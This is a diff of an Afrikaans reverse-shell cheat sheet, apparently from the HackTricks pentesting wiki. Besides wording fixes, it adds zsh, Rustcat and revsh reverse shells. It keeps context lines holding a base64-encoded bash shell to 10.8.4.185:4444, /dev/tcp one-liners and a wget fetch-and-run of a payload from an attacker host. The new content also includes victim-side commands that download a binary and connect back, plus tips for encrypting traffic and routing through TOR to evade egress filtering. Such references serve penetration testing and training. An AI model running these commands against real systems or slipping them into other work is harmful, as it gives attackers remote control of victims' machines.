@@ -6,7 +6,7 @@
 
 ## Volledige TTY
 
-**Sodra jy 'n reverse shell kry**[ **lees hierdie bladsy om 'n volledige TTY te verkry**](full-ttys.md)**.**
+**Sodra jy 'n omgekeerde shell kry**[ **lees hierdie bladsy om 'n volledige TTY te verkry**](full-ttys.md)**.**
 
 ## Bash | sh
 ```bash
@@ -34,10 +34,10 @@ echo bm9odXAgYmFzaCAtYyAnYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC44LjQuMTg1LzQ0NDQgMD4mMSc
 ```
 #### Shell verduideliking
 
-1. **`bash -i`**: Hierdie deel van die opdrag begin 'n interaktiewe (`-i`) Bash shell.
+1. **`bash -i`**: Hierdie deel van die opdrag begin 'n interaktiewe (`-i`) Bash-skal.
 2. **`>&`**: Hierdie deel van die opdrag is 'n kortnotasie vir **die herleiding van beide standaarduitset** (`stdout`) en **standaardfout** (`stderr`) na die **dieselfde bestemming**.
 3. **`/dev/tcp/<ATTACKER-IP>/<PORT>`**: Dit is 'n spesiale lêer wat **'n TCP-verbinding na die gespesifiseerde IP-adres en poort verteenwoordig**.
-- Deur **die uitset en foutstrome na hierdie lêer te herlei**, stuur die opdrag effektief die uitset van die interaktiewe shell-sessie na die aanvaller se masjien.
+- Deur **die uitset en foutstrome na hierdie lêer te herlei**, stuur die opdrag effektief die uitset van die interaktiewe skalsessie na die aanvaller se masjien.
 4. **`0>&1`**: Hierdie deel van die opdrag **herlei standaardinvoer (`stdin`) na die dieselfde bestemming as standaarduitset (`stdout`)**.
 
 ### Skep in lêer en voer uit
@@ -45,13 +45,13 @@ echo bm9odXAgYmFzaCAtYyAnYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC44LjQuMTg1LzQ0NDQgMD4mMSc
 echo -e '#!/bin/bash\nbash -i >& /dev/tcp/1<ATTACKER-IP>/<PORT> 0>&1' > /tmp/sh.sh; bash /tmp/sh.sh;
 wget http://<IP attacker>/shell.sh -P /tmp; chmod +x /tmp/shell.sh; /tmp/shell.sh
 ```
-## Voorwaartse Skulp
+## Forward Shell
 
-Wanneer jy te doen het met 'n **Remote Code Execution (RCE)** kwesbaarheid binne 'n Linux-gebaseerde webtoepassing, kan die bereiking van 'n omgekeerde skulp belemmer word deur netwerkverdedigings soos iptables reëls of ingewikkelde pakkiefiltrering meganismes. In sulke beperkte omgewings behels 'n alternatiewe benadering die vestiging van 'n PTY (Pseudo Terminal) skulp om meer effektief met die gecompromitteerde stelsel te kommunikeer.
+Wanneer jy met 'n **Remote Code Execution (RCE)** kwesbaarheid in 'n Linux-gebaseerde webtoepassing werk, kan die verkryging van 'n reverse shell belemmer word deur netwerkverdedigings soos iptables-reëls of ingewikkelde pakketfiltermeganismes. In sulke beperkte omgewings behels 'n alternatiewe benadering die vestiging van 'n PTY (Pseudo Terminal) shell om meer effektief met die gecompromitteerde stelsel te kommunikeer.
 
 'n Aanbevole hulpmiddel vir hierdie doel is [toboggan](https://github.com/n3rada/toboggan.git), wat interaksie met die teikenomgewing vereenvoudig.
 
-Om toboggan effektief te gebruik, skep 'n Python-module wat op die RCE-konteks van jou teikenstelsel afgestem is. Byvoorbeeld, 'n module genaamd `nix.py` kan as volg gestruktureer word:
+Om toboggan effektief te gebruik, skep 'n Python-module wat op die RCE-konteks van jou teikenstelsel aangepas is. Byvoorbeeld, 'n module genaamd `nix.py` kan as volg gestruktureer word:
 ```python3
 import jwt
 import httpx
@@ -219,6 +219,48 @@ or
 
 https://gitlab.com/0x4ndr3/blog/blob/master/JSgen/JSgen.py
 ```
+## Zsh (ingeboude TCP)
+```bash
+# Requires no external binaries; leverages zsh/net/tcp module
+zsh -c 'zmodload zsh/net/tcp; ztcp <ATTACKER-IP> <PORT>; zsh -i <&$REPLY >&$REPLY 2>&$REPLY'
+```
+## Rustcat (rcat)
+
+[https://github.com/robiot/rustcat](https://github.com/robiot/rustcat) – moderne netcat-agtige luisteraar geskryf in Rust (verpak in Kali sedert 2024).
+```bash
+# Attacker – interactive TLS listener with history & tab-completion
+rcat listen -ib 55600
+
+# Victim – download static binary and connect back with /bin/bash
+curl -L https://github.com/robiot/rustcat/releases/latest/download/rustcat-x86_64 -o /tmp/rcat \
+&& chmod +x /tmp/rcat \
+&& /tmp/rcat connect -s /bin/bash <ATTACKER-IP> 55600
+```
+Kenmerke:
+- Opsionele `--ssl` vlag vir versleutelde vervoer (TLS 1.3)
+- `-s` om enige binêre (bv. `/bin/sh`, `python3`) op die slagoffer te laat ontstaan
+- `--up` om outomaties op te gradeer na 'n volledig interaktiewe PTY
+
+## revsh (versleuteld & pivot-gereed)
+
+`revsh` is 'n klein C kliënt/bediener wat 'n volledige TTY oor 'n **versleutelde Diffie-Hellman tonnel** bied en kan opsioneel 'n **TUN/TAP** koppelvlak vir omgekeerde VPN-agtige pivotering heg.
+```bash
+# Build (or grab a pre-compiled binary from the releases page)
+git clone https://github.com/emptymonkey/revsh && cd revsh && make
+
+# Attacker – controller/listener on 443 with a pinned certificate
+revsh -c 0.0.0.0:443 -key key.pem -cert cert.pem
+
+# Victim – reverse shell over TLS to the attacker
+./revsh <ATTACKER-IP>:443
+```
+Nuttige vlae:
+- `-b` : bind-shell in plaas van omgekeerd
+- `-p socks5://127.0.0.1:9050` : proxy deur TOR/HTTP/SOCKS
+- `-t` : skep 'n TUN-koppelvlak (omgekeerde VPN)
+
+Omdat die hele sessie versleuteld en gemultiplex is, omseil dit dikwels eenvoudige uitgangsfiltrering wat 'n gewone teks `/dev/tcp` shell sou doodmaak.
+
 ## OpenSSL
 
 Die Aanvaller (Kali)
@@ -296,7 +338,7 @@ Dit sal probeer om met jou stelsel te verbind op poort 6001:
 ```bash
 xterm -display 10.0.0.1:1
 ```
-Om die omgekeerde dop te vang, kan jy gebruik maak van (wat op poort 6001 sal luister):
+Om die omgekeerde skulp te vang, kan jy gebruik maak van (wat op poort 6001 sal luister):
 ```bash
 # Authorize host
 xhost +targetip
@@ -318,5 +360,7 @@ Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new
 - [http://pentestmonkey.net/cheat-sheet/shells/reverse-shell](http://pentestmonkey.net/cheat-sheet/shells/reverse-shell)
 - [https://tcm1911.github.io/posts/whois-and-finger-reverse-shell/](https://tcm1911.github.io/posts/whois-and-finger-reverse-shell/)
 - [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md)
+- [https://github.com/robiot/rustcat](https://github.com/robiot/rustcat)
+- [https://github.com/emptymonkey/revsh](https://github.com/emptymonkey/revsh)
 
 {{#include ../../banners/hacktricks-training.md}}
